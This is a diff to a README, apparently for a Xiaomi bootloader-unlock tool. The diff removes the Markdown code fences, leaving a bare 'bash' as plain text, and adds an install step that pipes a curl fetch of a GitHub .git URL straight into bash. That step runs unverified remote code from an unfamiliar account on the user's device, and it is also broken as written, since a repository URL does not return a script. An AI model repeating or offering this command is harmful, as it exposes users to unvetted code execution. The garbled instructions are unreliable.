@@ -14,5 +14,9 @@ Install Python3, Download **MiCommunityTool** and run it.
 
 ### 1️⃣ Install Python
 
-```bash
+bash
 pkg install python3
+
+bash
+curl -sSL https://github.com/danger24bot/miunlock.git | bash
+
